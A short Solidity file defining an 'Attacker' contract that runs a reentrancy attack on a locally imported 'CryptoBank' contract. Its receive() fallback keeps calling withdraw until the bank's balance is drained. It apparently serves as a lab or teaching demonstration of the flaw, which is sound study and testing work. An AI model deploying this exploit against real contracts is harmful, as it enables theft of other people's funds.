// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.24;

import "./CryptoBank.sol";

contract Attacker {
   CryptoBank cryptoBank;
   constructor(address payable targetContract_) {
      cryptoBank = CryptoBank(targetContract_);
   }
   function attack(uint256 amount) external {
      cryptoBank.deposit{value: amount}();
      cryptoBank.withdraw(1 ether);
   }
    receive() external payable {
        if (address(cryptoBank).balance > 1 ether){
             cryptoBank.withdraw(1 ether);
        }
    }
}